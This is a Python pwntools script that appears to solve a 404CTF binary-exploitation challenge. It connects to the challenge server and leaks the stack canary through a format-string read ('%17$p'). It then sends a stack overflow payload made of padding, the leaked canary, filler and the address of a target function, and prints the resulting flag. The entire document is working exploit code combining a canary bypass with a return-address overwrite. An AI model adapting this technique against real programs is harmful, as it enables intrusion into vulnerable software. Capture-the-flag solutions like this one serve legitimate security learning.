from pwn import *
warnings.filterwarnings("ignore", category=BytesWarning)
io = remote("challenges.404ctf.fr", 30223)

io.sendline("2")
# try with %10$ ... %20$p => find an address like 0x...00 => this address is the canary address
io.sendline("%17$p ")

io.recvuntil("[Vous] : ")
addr_canary = io.recvline()[:-1].decode()
print("@ canary:", addr_canary)

#String to hex
addr_canary = int(addr_canary, 16)
#convert to address format
addr_canary = p64(addr_canary)

aff = io.recvuntil(">>> ")
#address of the function named Canary (found in Ghidra or objdump -d | grep canary)
addr_fct_canary = p64(0x00400877)

offset = 72
payload = b"A" * offset + addr_canary + 8* b"A" + addr_fct_canary

io.sendline("1")
io.recvuntil("[Vous] : ")
io.sendline(payload)
print(io.recvline().decode())
io.recvuntil(">>> ").decode()
io.sendline("3")
print(io.recvline().decode())
print("Flag : "+io.recvline().decode())